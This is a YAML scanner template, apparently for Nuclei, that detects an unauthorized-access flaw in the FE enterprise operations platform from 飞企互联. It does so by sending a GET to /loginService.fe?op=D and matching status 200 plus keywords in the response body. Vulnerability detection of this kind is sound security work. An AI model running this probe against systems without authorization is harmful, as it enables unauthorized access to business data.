script_name: [FE-OAERP-Unauthorized-access]: 飞企互联-FE企业运营管理平台-未授权访问
content:
id: FE-OAERP-Unauthorized-access

info:
  name: 飞企互联-FE企业运营管理平台-未授权访问
  author: yuyin
  severity: medium
  description: 检测飞企互联-FE企业运营管理平台中的未授权访问漏洞，通过发送特定的 GET 请求，如果响应中包含指定的关键字，则表示存在未授权访问漏洞。
  reference:
    - https://
  tags: unauthorized-access, FE-OAERP

requests:
  - raw:
      - |-
        GET /loginService.fe?op=D HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: JSESSIONID=7843333DE29BC9CB87D4C727D55C1848
        Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - 流程未开始
          - 被修改
          - 删除
        part: body
